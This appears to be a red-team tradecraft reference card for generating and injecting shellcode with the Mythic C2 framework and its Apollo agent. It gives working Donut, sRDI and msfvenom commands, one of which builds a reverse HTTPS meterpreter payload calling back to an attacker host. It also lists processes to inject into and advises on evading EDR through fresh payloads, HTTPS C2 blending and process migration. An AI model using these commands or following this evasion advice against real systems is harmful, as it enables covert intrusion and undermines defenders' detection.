---
name: Shellcode Generation Reference
category: defense-evasion
subcategories: [shellcode, payload-generation, c2-payload, stager]
tradecraft_tags: [shellcode, payload, stager, generation, msfvenom, donut, sRDI, reference]
mitre_attack:
  - id: T1059
    name: Command and Scripting Interpreter
source:
  url: https://attack.mitre.org/techniques/T1059/
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows, linux]
architecture: [x64]
privilege_required: none
network_required: false
detection_signal: |
  This is an attacker-infrastructure reference. Detection signals depend on the
  generated payload's behavior, not the generation tool.
usage_examples:
  - description: Mythic generates Apollo stager shellcode via payload creation
    args: "(Mythic UI → Create Payload → Apollo → select profile → generate)"
  - description: Donut converts .NET assemblies to shellcode for shinject
    args: "donut -a 2 -e 1 -f 1 -o output.bin tool.exe"
  - description: msfvenom generates shellcode (Metasploit, infrastructure-side)
    args: "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER LPORT=443 -f raw -o payload.bin"
opsec_notes: |
  This is a reference document for shellcode and payload generation approaches used
  in conjunction with Sage/Mythic. Mythic-native payload generation is the primary path.
  Donut converts existing tools to shellcode for Apollo's shinject command.
gotchas: |
  msfvenom-generated shellcode is heavily signatured. For operational use, use Donut
  or Mythic-native payload generation. Custom shellcode from Mythic/Apollo is less
  commonly signatured than public msfvenom templates.
related_ttps: [donut, process-injection, inline-execute-pe, inceptor]
alternatives: []
common_args: {}
last_updated: 2026-05-29
---

# Shellcode Generation Reference

Reference for generating shellcode payloads for use with Apollo's `shinject` command
or for stagers in delivery scenarios.

## Mythic-Native Payload Generation (Primary Path)

```
Mythic UI:
1. Payloads → Generate New Payload
2. Select: Apollo (or Athena)
3. Configure: C2 profile, callback URL, sleep interval
4. Generate → Download shellcode/PE binary
5. Upload to Mythic file store for shinject or delivery
```

## Donut Conversion (For Existing .NET Tools)

```bash
# Convert any .NET assembly to shellcode:
donut -a 2 -e 3 -f 1 -o output.bin tool.exe

# With arguments:
donut -a 2 -f 1 -p '-c All --ZipFilename out.zip' -o sharphound.bin SharpHound.exe

# Apollo shinject usage:
# 1. Upload output.bin to Mythic file store → get UUID
# 2. Apollo: shinject <target_pid> <UUID>
```

## sRDI (Shellcode Reflective DLL Injection)

```python
# Convert a DLL to shellcode:
python sRDI.py payload.dll
# Output: shellcode that loads the DLL without the Windows loader
```

## Shellcode Injection Targets (Apollo shinject)

| Process | Notes |
|---------|-------|
| notepad.exe | Common sacrificial process |
| explorer.exe | Long-lived, user context |
| svchost.exe | SYSTEM or service context |
| RuntimeBroker.exe | Modern Windows, expected to be running |

## Common Mistakes

1. **Using msfvenom default templates** → immediately detected by EDR
2. **Injecting into already-monitored processes** → doubles detection surface
3. **Keeping shellcode on disk** → EDR memory scans, file scans
4. **Reusing shellcode across operations** → hash signatures accumulate

## Best Practices

- Generate fresh shellcode for each operation (different compilation artifacts)
- Use HTTPS C2 callbacks (blends with normal HTTPS traffic)
- Choose injection targets based on network activity (a browser for HTTP C2 blends better)
- Consider process migration immediately after initial injection for stability
